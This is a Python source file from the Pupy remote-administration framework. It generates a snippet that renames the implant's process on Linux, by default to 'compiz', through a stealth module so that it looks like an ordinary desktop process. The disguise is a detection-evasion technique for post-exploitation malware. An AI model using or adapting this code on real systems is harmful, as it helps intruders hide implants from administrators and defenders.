#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
import textwrap, random, string
from scriptlets import *

class ScriptletGenerator(Scriptlet):
    """ change pupy process's name """

    dependencies = {
        'linux': [ 'pupystealth.change_argv' ]
    }

    arguments = {
        'name': 'ex: compiz'
    }

    def __init__(self, name="compiz"):
        self.name=name

    def generate(self, os):
        return textwrap.dedent("""
        import sys
        if sys.platform=="linux2":
            import pupystealth.change_argv
            pupystealth.change_argv.change_argv(argv={})
        """.format(repr(self.name)))
